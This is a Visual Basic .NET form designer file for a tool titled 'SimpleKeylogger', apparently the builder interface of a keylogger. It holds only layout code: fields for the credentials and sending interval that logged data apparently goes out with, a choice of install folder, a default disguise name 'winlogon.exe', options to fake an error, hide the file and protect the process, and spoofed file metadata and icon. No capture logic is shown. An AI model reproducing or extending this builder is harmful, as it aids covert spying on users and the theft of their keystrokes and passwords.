<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.TabControl1 = New System.Windows.Forms.TabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.TextName = New System.Windows.Forms.TextBox()
        Me.CheckPProcess = New System.Windows.Forms.CheckBox()
        Me.CheckError = New System.Windows.Forms.CheckBox()
        Me.CheckHide = New System.Windows.Forms.CheckBox()
        Me.CheckAPI = New System.Windows.Forms.CheckBox()
        Me.CheckJunk = New System.Windows.Forms.CheckBox()
        Me.TextInstall = New System.Windows.Forms.ComboBox()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TextInterval = New System.Windows.Forms.NumericUpDown()
        Me.TextPassword = New System.Windows.Forms.TextBox()
        Me.TextUsername = New System.Windows.Forms.TextBox()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.randyinfo = New System.Windows.Forms.Button()
        Me.Copyright = New System.Windows.Forms.TextBox()
        Me.trademark = New System.Windows.Forms.TextBox()
        Me.Product = New System.Windows.Forms.TextBox()
        Me.Company = New System.Windows.Forms.TextBox()
        Me.Description = New System.Windows.Forms.TextBox()
        Me.Title = New System.Windows.Forms.TextBox()
        Me.TextICON = New System.Windows.Forms.TextBox()
        Me.iconbrowse = New System.Windows.Forms.Button()
        Me.iconpic = New System.Windows.Forms.PictureBox()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.TabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        CType(Me.TextInterval, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.TabPage2.SuspendLayout()
        CType(Me.iconpic, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'TabControl1
        '
        Me.TabControl1.Controls.Add(Me.TabPage1)
        Me.TabControl1.Controls.Add(Me.TabPage2)
        Me.TabControl1.Location = New System.Drawing.Point(12, 12)
        Me.TabControl1.Name = "TabControl1"
        Me.TabControl1.SelectedIndex = 0
        Me.TabControl1.Size = New System.Drawing.Size(380, 187)
        Me.TabControl1.TabIndex = 1
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.Black
        Me.TabPage1.Controls.Add(Me.Label2)
        Me.TabPage1.Controls.Add(Me.Label3)
        Me.TabPage1.Controls.Add(Me.GroupBox1)
        Me.TabPage1.Controls.Add(Me.TextInterval)
        Me.TabPage1.Controls.Add(Me.TextPassword)
        Me.TabPage1.Controls.Add(Me.TextUsername)
        Me.TabPage1.ForeColor = System.Drawing.Color.White
        Me.TabPage1.Location = New System.Drawing.Point(4, 21)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(372, 162)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "[Server Settings]"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Lucida Console", 36.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.Location = New System.Drawing.Point(25, 5)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(49, 48)
        Me.Label2.TabIndex = 4
        Me.Label2.Text = "►"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(235, 22)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(131, 11)
        Me.Label3.TabIndex = 2
        Me.Label3.Text = "[Sending Interval]"
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.TextName)
        Me.GroupBox1.Controls.Add(Me.CheckPProcess)
        Me.GroupBox1.Controls.Add(Me.CheckError)
        Me.GroupBox1.Controls.Add(Me.CheckHide)
        Me.GroupBox1.Controls.Add(Me.CheckAPI)
        Me.GroupBox1.Controls.Add(Me.CheckJunk)
        Me.GroupBox1.Controls.Add(Me.TextInstall)
        Me.GroupBox1.Controls.Add(Me.Label1)
        Me.GroupBox1.ForeColor = System.Drawing.Color.White
        Me.GroupBox1.Location = New System.Drawing.Point(7, 56)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(359, 100)
        Me.GroupBox1.TabIndex = 3
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "[Configuration]"
        '
        'TextName
        '
        Me.TextName.BackColor = System.Drawing.Color.Black
        Me.TextName.ForeColor = System.Drawing.Color.White
        Me.TextName.Location = New System.Drawing.Point(7, 42)
        Me.TextName.Name = "TextName"
        Me.TextName.Size = New System.Drawing.Size(90, 18)
        Me.TextName.TabIndex = 4
        Me.TextName.Text = "winlogon.exe"
        Me.TextName.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'CheckPProcess
        '
        Me.CheckPProcess.AutoSize = True
        Me.CheckPProcess.Location = New System.Drawing.Point(207, 65)
        Me.CheckPProcess.Name = "CheckPProcess"
        Me.CheckPProcess.Size = New System.Drawing.Size(129, 15)
        Me.CheckPProcess.TabIndex = 3
        Me.CheckPProcess.Text = "Protect Process"
        Me.CheckPProcess.UseVisualStyleBackColor = True
        '
        'CheckError
        '
        Me.CheckError.AutoSize = True
        Me.CheckError.Location = New System.Drawing.Point(103, 44)
        Me.CheckError.Name = "CheckError"
        Me.CheckError.Size = New System.Drawing.Size(94, 15)
        Me.CheckError.TabIndex = 3
        Me.CheckError.Text = "Fake Error"
        Me.CheckError.UseVisualStyleBackColor = True
        '
        'CheckHide
        '
        Me.CheckHide.AutoSize = True
        Me.CheckHide.Location = New System.Drawing.Point(103, 65)
        Me.CheckHide.Name = "CheckHide"
        Me.CheckHide.Size = New System.Drawing.Size(87, 15)
        Me.CheckHide.TabIndex = 3
        Me.CheckHide.Text = "Hide File"
        Me.CheckHide.UseVisualStyleBackColor = True
        '
        'CheckAPI
        '
        Me.CheckAPI.AutoSize = True
        Me.CheckAPI.Location = New System.Drawing.Point(7, 65)
        Me.CheckAPI.Name = "CheckAPI"
        Me.CheckAPI.Size = New System.Drawing.Size(80, 15)
        Me.CheckAPI.TabIndex = 3
        Me.CheckAPI.Text = "Add APIs"
        Me.CheckAPI.UseVisualStyleBackColor = True
        '
        'CheckJunk
        '
        Me.CheckJunk.AutoSize = True
        Me.CheckJunk.Location = New System.Drawing.Point(207, 44)
        Me.CheckJunk.Name = "CheckJunk"
        Me.CheckJunk.Size = New System.Drawing.Size(143, 15)
        Me.CheckJunk.TabIndex = 3
        Me.CheckJunk.Text = "Uptime + Programs"
        Me.CheckJunk.UseVisualStyleBackColor = True
        '
        'TextInstall
        '
        Me.TextInstall.BackColor = System.Drawing.Color.Black
        Me.TextInstall.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.TextInstall.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.TextInstall.ForeColor = System.Drawing.Color.White
        Me.TextInstall.FormattingEnabled = True
        Me.TextInstall.Items.AddRange(New Object() {"System.IO.Path.GetTempPath", "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)", "Environment.GetEnvironmentVariable(""windir"")"})
        Me.TextInstall.Location = New System.Drawing.Point(7, 18)
        Me.TextInstall.Name = "TextInstall"
        Me.TextInstall.Size = New System.Drawing.Size(259, 19)
        Me.TextInstall.TabIndex = 0
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(264, 21)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(89, 11)
        Me.Label1.TabIndex = 2
        Me.Label1.Text = "[Install To]"
        '
        'TextInterval
        '
        Me.TextInterval.BackColor = System.Drawing.Color.Black
        Me.TextInterval.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextInterval.ForeColor = System.Drawing.Color.White
        Me.TextInterval.Location = New System.Drawing.Point(186, 20)
        Me.TextInterval.Name = "TextInterval"
        Me.TextInterval.Size = New System.Drawing.Size(42, 18)
        Me.TextInterval.TabIndex = 1
        Me.TextInterval.Value = New Decimal(New Integer() {5, 0, 0, 0})
        '
        'TextPassword
        '
        Me.TextPassword.BackColor = System.Drawing.Color.Black
        Me.TextPassword.ForeColor = System.Drawing.Color.White
        Me.TextPassword.Location = New System.Drawing.Point(80, 34)
        Me.TextPassword.Name = "TextPassword"
        Me.TextPassword.Size = New System.Drawing.Size(100, 18)
        Me.TextPassword.TabIndex = 0
        Me.TextPassword.Text = "Password"
        Me.TextPassword.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'TextUsername
        '
        Me.TextUsername.BackColor = System.Drawing.Color.Black
        Me.TextUsername.ForeColor = System.Drawing.Color.White
        Me.TextUsername.Location = New System.Drawing.Point(80, 10)
        Me.TextUsername.Name = "TextUsername"
        Me.TextUsername.Size = New System.Drawing.Size(100, 18)
        Me.TextUsername.TabIndex = 0
        Me.TextUsername.Text = "Username"
        Me.TextUsername.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.Black
        Me.TabPage2.Controls.Add(Me.Label5)
        Me.TabPage2.Controls.Add(Me.Label4)
        Me.TabPage2.Controls.Add(Me.randyinfo)
        Me.TabPage2.Controls.Add(Me.Copyright)
        Me.TabPage2.Controls.Add(Me.trademark)
        Me.TabPage2.Controls.Add(Me.Product)
        Me.TabPage2.Controls.Add(Me.Company)
        Me.TabPage2.Controls.Add(Me.Description)
        Me.TabPage2.Controls.Add(Me.Title)
        Me.TabPage2.Controls.Add(Me.TextICON)
        Me.TabPage2.Controls.Add(Me.iconbrowse)
        Me.TabPage2.Controls.Add(Me.iconpic)
        Me.TabPage2.Controls.Add(Me.Button1)
        Me.TabPage2.ForeColor = System.Drawing.Color.White
        Me.TabPage2.Location = New System.Drawing.Point(4, 21)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(372, 162)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "[Build Settings]"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Lucida Console", 27.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label5.Location = New System.Drawing.Point(30, 1)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(83, 37)
        Me.Label5.TabIndex = 6
        Me.Label5.Text = "---"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Font = New System.Drawing.Font("Lucida Console", 27.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label4.Location = New System.Drawing.Point(30, 123)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(83, 37)
        Me.Label4.TabIndex = 6
        Me.Label4.Text = "---"
        '
        'randyinfo
        '
        Me.randyinfo.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.randyinfo.Location = New System.Drawing.Point(132, 141)
        Me.randyinfo.Name = "randyinfo"
        Me.randyinfo.Size = New System.Drawing.Size(110, 22)
        Me.randyinfo.TabIndex = 5
        Me.randyinfo.Text = "Random Info"
        Me.randyinfo.UseVisualStyleBackColor = True
        '
        'Copyright
        '
        Me.Copyright.BackColor = System.Drawing.Color.Black
        Me.Copyright.ForeColor = System.Drawing.Color.White
        Me.Copyright.Location = New System.Drawing.Point(132, 96)
        Me.Copyright.Name = "Copyright"
        Me.Copyright.Size = New System.Drawing.Size(110, 18)
        Me.Copyright.TabIndex = 4
        Me.Copyright.Text = "Copyright"
        Me.Copyright.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'trademark
        '
        Me.trademark.BackColor = System.Drawing.Color.Black
        Me.trademark.ForeColor = System.Drawing.Color.White
        Me.trademark.Location = New System.Drawing.Point(132, 120)
        Me.trademark.Name = "trademark"
        Me.trademark.Size = New System.Drawing.Size(110, 18)
        Me.trademark.TabIndex = 4
        Me.trademark.Text = "Trademark"
        Me.trademark.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Product
        '
        Me.Product.BackColor = System.Drawing.Color.Black
        Me.Product.ForeColor = System.Drawing.Color.White
        Me.Product.Location = New System.Drawing.Point(132, 72)
        Me.Product.Name = "Product"
        Me.Product.Size = New System.Drawing.Size(110, 18)
        Me.Product.TabIndex = 4
        Me.Product.Text = "Product"
        Me.Product.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Company
        '
        Me.Company.BackColor = System.Drawing.Color.Black
        Me.Company.ForeColor = System.Drawing.Color.White
        Me.Company.Location = New System.Drawing.Point(132, 48)
        Me.Company.Name = "Company"
        Me.Company.Size = New System.Drawing.Size(110, 18)
        Me.Company.TabIndex = 4
        Me.Company.Text = "Company"
        Me.Company.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Description
        '
        Me.Description.BackColor = System.Drawing.Color.Black
        Me.Description.ForeColor = System.Drawing.Color.White
        Me.Description.Location = New System.Drawing.Point(132, 24)
        Me.Description.Name = "Description"
        Me.Description.Size = New System.Drawing.Size(110, 18)
        Me.Description.TabIndex = 4
        Me.Description.Text = "Description"
        Me.Description.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'Title
        '
        Me.Title.BackColor = System.Drawing.Color.Black
        Me.Title.ForeColor = System.Drawing.Color.White
        Me.Title.Location = New System.Drawing.Point(132, 0)
        Me.Title.Name = "Title"
        Me.Title.Size = New System.Drawing.Size(110, 18)
        Me.Title.TabIndex = 4
        Me.Title.Text = "Title"
        Me.Title.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        '
        'TextICON
        '
        Me.TextICON.Location = New System.Drawing.Point(358, 6)
        Me.TextICON.Name = "TextICON"
        Me.TextICON.Size = New System.Drawing.Size(11, 18)
        Me.TextICON.TabIndex = 3
        Me.TextICON.Visible = False
        '
        'iconbrowse
        '
        Me.iconbrowse.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.iconbrowse.Location = New System.Drawing.Point(24, 97)
        Me.iconbrowse.Name = "iconbrowse"
        Me.iconbrowse.Size = New System.Drawing.Size(93, 23)
        Me.iconbrowse.TabIndex = 2
        Me.iconbrowse.Text = "Browse Icon"
        Me.iconbrowse.UseVisualStyleBackColor = True
        '
        'iconpic
        '
        Me.iconpic.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center
        Me.iconpic.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D
        Me.iconpic.Location = New System.Drawing.Point(46, 41)
        Me.iconpic.Name = "iconpic"
        Me.iconpic.Size = New System.Drawing.Size(52, 50)
        Me.iconpic.TabIndex = 1
        Me.iconpic.TabStop = False
        '
        'Button1
        '
        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button1.Font = New System.Drawing.Font("Lucida Console", 14.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Button1.Location = New System.Drawing.Point(248, 9)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(104, 148)
        Me.Button1.TabIndex = 0
        Me.Button1.Text = "[Build]"
        Me.Button1.UseVisualStyleBackColor = True
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 11.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.Black
        Me.ClientSize = New System.Drawing.Size(728, 293)
        Me.Controls.Add(Me.TabControl1)
        Me.Font = New System.Drawing.Font("Lucida Console", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "SimpleKeylogger"
        Me.TabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        CType(Me.TextInterval, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        CType(Me.iconpic, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents TabControl1 As System.Windows.Forms.TabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents CheckPProcess As System.Windows.Forms.CheckBox
    Friend WithEvents CheckError As System.Windows.Forms.CheckBox
    Friend WithEvents CheckHide As System.Windows.Forms.CheckBox
    Friend WithEvents CheckAPI As System.Windows.Forms.CheckBox
    Friend WithEvents CheckJunk As System.Windows.Forms.CheckBox
    Friend WithEvents TextInstall As System.Windows.Forms.ComboBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents TextInterval As System.Windows.Forms.NumericUpDown
    Friend WithEvents TextPassword As System.Windows.Forms.TextBox
    Friend WithEvents TextUsername As System.Windows.Forms.TextBox
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents Button1 As System.Windows.Forms.Button
    Friend WithEvents TextName As System.Windows.Forms.TextBox
    Friend WithEvents TextICON As System.Windows.Forms.TextBox
    Friend WithEvents iconbrowse As System.Windows.Forms.Button
    Friend WithEvents iconpic As System.Windows.Forms.PictureBox
    Friend WithEvents Copyright As System.Windows.Forms.TextBox
    Friend WithEvents trademark As System.Windows.Forms.TextBox
    Friend WithEvents Product As System.Windows.Forms.TextBox
    Friend WithEvents Company As System.Windows.Forms.TextBox
    Friend WithEvents Description As System.Windows.Forms.TextBox
    Friend WithEvents Title As System.Windows.Forms.TextBox
    Friend WithEvents randyinfo As System.Windows.Forms.Button
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents Label4 As System.Windows.Forms.Label

End Class
